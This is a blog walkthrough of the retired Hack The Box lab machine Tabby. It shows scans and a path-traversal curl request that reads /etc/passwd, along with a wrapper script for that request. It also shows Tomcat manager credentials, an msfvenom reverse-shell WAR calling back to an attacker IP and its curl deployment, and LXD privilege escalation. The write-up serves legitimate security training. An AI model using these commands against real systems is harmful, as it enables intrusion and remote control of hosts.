---
layout: post  
title: "Tabby: Hack The Box Walkthrough"
date: 2020-11-09 14:20:04 +0000
last_modified_at: 2020-11-09 14:20:04 +0000
category: Walkthrough
tags: ["Hack The Box", Tabby, retired, Linux, Easy]
comments: true
protect: false
image:
  feature: tabby-htb-walkthrough.png
---

This post documents the complete walkthrough of Tabby, a retired vulnerable [VM][1] created by [egre55][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}


## Background

Tabby is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.194 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-21 10:53:10 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.194
Discovered open port 22/tcp on 10.10.10.194
Discovered open port 80/tcp on 10.10.10.194
```

Hmm, nothing unusual stood out. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,8080 -A --reason 10.10.10.194 -oN nmap.txt
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
```

Looks like it has something to do with Apache Tomcat, going by the name Tabby. :wink: This is what the two `http` services look like.

### `80/tcp`

{% include image.html image_alt="949627b4.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/949627b4.png" %}

I'd better add `megahosting.htb` into `/etc/hosts`.

### `8080/tcp`

{% include image.html image_alt="e932cdad.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/e932cdad.png" %}

### Data Breach

We see that there have had been a data breach at `http://megahosting.htb/news.php?file=statement`.

{% include image.html image_alt="8f925dd0.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/8f925dd0.png" %}

### Directory/File Enumeration

Let's go with `wfuzz` and see we can find.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc 404 http://megahosting.htb/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://megahosting.htb/FUZZ
Total requests: 4652

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000012:   403        9 L      28 W     280 Ch      ".htpasswd"
000000010:   403        9 L      28 W     280 Ch      ".hta"
000000011:   403        9 L      28 W     280 Ch      ".htaccess"
000000695:   301        9 L      28 W     319 Ch      "assets"
000001720:   200        1 L      9 W      759 Ch      "favicon.ico"
000001749:   301        9 L      28 W     318 Ch      "files"
000002151:   200        373 L    938 W    14175 Ch    "index.php"
000003654:   403        9 L      28 W     280 Ch      "server-status"

Total time: 81.28365
Processed Requests: 4652
Filtered Requests: 4644
Requests/sec.: 57.23167
```

Let's go one more level with `/files/`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc 404 http://megahosting.htb/files/FUZZ
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://megahosting.htb/files/FUZZ
Total requests: 4652

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000010:   403        9 L      28 W     280 Ch      ".hta"
000000011:   403        9 L      28 W     280 Ch      ".htaccess"
000000012:   403        9 L      28 W     280 Ch      ".htpasswd"
000000660:   301        9 L      28 W     326 Ch      "archive"
000003891:   200        150 L    375 W    6507 Ch     "statement"

Total time: 83.58826
Processed Requests: 4652
Filtered Requests: 4647
Requests/sec.: 55.65374
```

### Local File Inclusion

Looking at the presence of `/files/statement` and `/news.php?file=statement`, I think it's reasonable to infer a LFI vulnerability. Let's test it out.

```
# curl -i "http://megahosting.htb/news.php?file=../../../../etc/passwd"
HTTP/1.1 200 OK
Date: Sun, 21 Jun 2020 14:45:24 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1850
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Awesome. I wrote a simple shell script as a wrapper for the `curl` command above to ease reading of files.

<div class="filename"><span>read.sh</span></div>

```bash
#!/bin/bash

FILE=$1
HOST=megahosting.htb
TRAV="../../../.."

curl -s \
     "http://${HOST}/news.php?file=${TRAV}/${FILE}"
```

### Tomcat 9 Enumeration

Let's use our newfound capability to enumerate further. Maybe we can get the credentials to access either the `manager` or `host-manager` app in Tomcat?

{% include image.html image_alt="195c8881.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/195c8881.png" %}

OK. The box is running the latest LTS version of Ubuntu, i.e. Focal Fossa. Next up, let's look at the [list](https://packages.ubuntu.com/focal/all/tomcat9/filelist) of files in the `tomcat9` package for `focal`.

{% include image.html image_alt="be9d268d.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/be9d268d.png" %}

Now, see if we can read `/usr/share/tomcat9/etc/tomcat-users.xml`.

{% include image.html image_alt="023c0c36.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/023c0c36.png" %}

Sweet. The user `tomcat` has `manager-script` role. We can deploy a malicious web application!

## Low-Privilege Shell

Create a malicious web application that'll run a reverse shell back to us with `msfvenom` like so.

```
# msfvenom -p java/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f war -o rev.war
```

Upload the WAR file like so.

```
# curl -T rev.war 'http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/rev'
```

Run the web application `http://10.10.10.194:8080/rev/`.

{% include image.html image_alt="755c6375.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/755c6375.png" %}

### Getting `user.txt`

It should be obvious that `user.txt` is in `ash`'s home directory but how do we get access to `ash`'s account?

{% include image.html image_alt="f861c817.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/f861c817.png" %}

I've transferred a copy to my local machine for further analysis. Looks like it's password-protected.

{% include image.html image_alt="446e825b.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/446e825b.png" %}

John the Ripper to the rescue.

{% include image.html image_alt="3e868b1b.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/3e868b1b.png" %}

Offline cracking is fast.

{% include image.html image_alt="7c9d4096.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/7c9d4096.png" %}

Maybe `admin@it` is `ash`'s password?

{% include image.html image_alt="27dae7d8.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/27dae7d8.png" %}

Indeed it is.

## Privilege Escalation

During enumeration of ash's account, I notice that the account is a member of the `lxd` group. As such, it's susceptible to a privilege escalation exploit described [here](https://www.hackingarticles.in/lxd-privilege-escalation/). Lucky for me, someone built the Alpine image and uploaded to `ash`'s home directory, saving me time and bandwidth.

{% include image.html image_alt="845d4a0e.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/845d4a0e.png" %}

Furthermore, the container is already running. :laughing:

{% include image.html image_alt="18595b99.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/18595b99.png" %}

Thank you anonymous HTB player! :kiss: With that, it's trivial to launch a shell as `root`.

{% include image.html image_alt="abce4c9c.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/abce4c9c.png" %}

It's easy to find out where the container is mounted.

{% include image.html image_alt="df248ef9.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/df248ef9.png" %}

Finally, let's get that `root.txt`.

{% include image.html image_alt="e9ad68dd.png" image_src="/9d08c5bf-f5a0-4668-a9c6-f6170cedafb7/e9ad68dd.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/259
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/
